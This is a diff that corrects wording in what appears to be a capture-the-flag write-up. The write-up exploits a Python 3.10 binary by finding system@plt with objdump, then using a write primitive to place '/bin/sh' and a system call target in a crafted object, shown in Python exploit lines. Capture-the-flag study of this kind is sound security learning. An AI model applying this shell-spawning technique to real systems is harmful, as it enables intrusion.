@@ -147,7 +147,7 @@ and write something at `obj+16`
 
 I was stuck here for a very long time, since i was trying ropping and using syscalls, unable to pivot the stack. Having no leak for system i couldnt call system directly from there, i tried fuzzing huge indexes to get leaks like those
 
-Then i realized the python binary might have plts which resolve the address thanks to gpt :')
+Then i realized the python binary might have plts which resolve the addresses, thanks to gpt :')
 
 ```
 $ objdump -d python3.10 | grep system
@@ -158,7 +158,7 @@ $ objdump -d python3.10 | grep system
 
 awesome.
 
-So we can call system, and `RDI` has points to `obj` so we can write the `/bin/sh` str at obj, write `system@plt` at `obj+16` and make `obj+8` `obj+16-0xb8`
+So we can call system, and `RDI` points to `obj` so we can write the `/bin/sh` str at obj, write `system@plt` at `obj+16` and make `obj+8` `obj+16-0xb8`
 ```python
 w64(r,obj,obj,u64(b'/bin/sh\x00'))
 w64(r,obj+8,obj,(obj+16)-0xb8)
